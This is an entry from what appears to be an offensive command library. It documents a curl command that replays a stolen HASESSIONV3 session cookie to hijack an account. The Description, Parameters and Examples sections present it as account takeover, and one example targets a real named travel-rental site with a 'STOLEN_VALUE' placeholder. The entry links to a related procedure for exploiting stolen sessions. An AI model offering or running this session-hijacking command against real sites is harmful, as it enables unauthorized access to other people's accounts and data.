---
id: i9j0k1l2-m3n4-5678-ijkl-901234567890
name: curl-set-session-cookie
type: command
executor: bash
data: 'curl -H "Cookie: HASESSIONV3=TOKEN" URL -v'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.629Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - http
  - session
  - takeover
verified: false
validated: true
submitted: true
---

# curl-set-session-cookie

## Command

```bash
curl -H "Cookie: HASESSIONV3=TOKEN" URL -v
```

## Description

Sends requests with stolen session cookie to hijack authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: HASESSIONV3=TOKEN"` | Stolen session token | Yes |
| `URL` | Protected account URL | Yes |
| `-v` | Verbose for status checks | No |

## Examples

### Basic Usage

```bash
curl -H "Cookie: HASESSIONV3=abc123" https://example.com/account -v
```

### Advanced Usage

```bash
curl -H "Cookie: HASESSIONV3=STOLEN_VALUE" https://www.abritel.fr/account/profile -v
```

## Expected Output

200 OK with account content, confirming authenticated access.

## Related

- [[Related Procedure: Exploit-Stolen-Session-for-Account-Takeover]]
